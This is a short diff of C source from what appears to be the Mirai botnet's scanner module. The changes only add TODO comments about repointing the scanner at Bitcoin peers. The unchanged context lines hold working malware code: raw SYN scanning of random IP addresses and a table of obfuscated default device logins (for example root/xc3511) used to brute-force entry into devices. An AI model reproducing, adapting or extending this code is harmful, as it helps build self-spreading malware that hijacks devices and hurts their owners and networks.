@@ -96,7 +96,7 @@ void scanner_init(void)
         exit(0);
     }
 
-    do
+    do //TODO replace with BTC client port
     {
         source_port = rand_next() & 0xffff;
     }
@@ -120,7 +120,7 @@ void scanner_init(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords
+    // Set up passwords //TODO delete password section
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -210,7 +210,7 @@ void scanner_init(void)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-                iph->daddr = get_random_ip();
+                iph->daddr = get_random_ip(); //TODO change with peer addr?
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -442,7 +442,7 @@ void scanner_init(void)
                     conn->rdbuf_pos += ret;
                     conn->last_recv = fake_time;
 
-                    while (TRUE)
+                    while (TRUE) //TODO change with bitcoin connection and client version check
                     {
                         int consumed = 0;
 
